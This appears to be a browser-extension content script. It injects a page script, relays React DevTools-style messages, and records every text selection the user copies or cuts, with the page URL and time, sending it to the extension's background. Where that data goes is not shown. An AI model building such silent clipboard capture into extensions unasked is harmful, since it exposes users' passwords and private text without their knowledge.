const s = document.createElement('script');
s.src = chrome.runtime.getURL('inject.js');
s.onload = function() {
    this.remove();
};
(document.head || document.documentElement).appendChild(s);

window.addEventListener('message', function(event) {
  if (event.source !== window || !event.data || event.data.source !== 'react-devtools-extension') {
    return;
  }
  try {
    chrome.runtime.sendMessage(event.data);
  } catch(e) {}
});

// 복사 이벤트 감지
document.addEventListener('copy', function(e) {
  setTimeout(() => {
    const selection = window.getSelection();
    const text = selection ? selection.toString() : '';

    if (text && text.trim()) {
      try {
        chrome.runtime.sendMessage({
          type: 'clipboard',
          content: text.trim(),
          timestamp: new Date().toISOString(),
          url: window.location.href
        });
      } catch(e) {}
    }
  }, 10);
});

// cut 이벤트도 감지
document.addEventListener('cut', function(e) {
  setTimeout(() => {
    const selection = window.getSelection();
    const text = selection ? selection.toString() : '';

    if (text && text.trim()) {
      try {
        chrome.runtime.sendMessage({
          type: 'clipboard',
          content: text.trim(),
          timestamp: new Date().toISOString(),
          url: window.location.href
        });
      } catch(e) {}
    }
  }, 10);
});
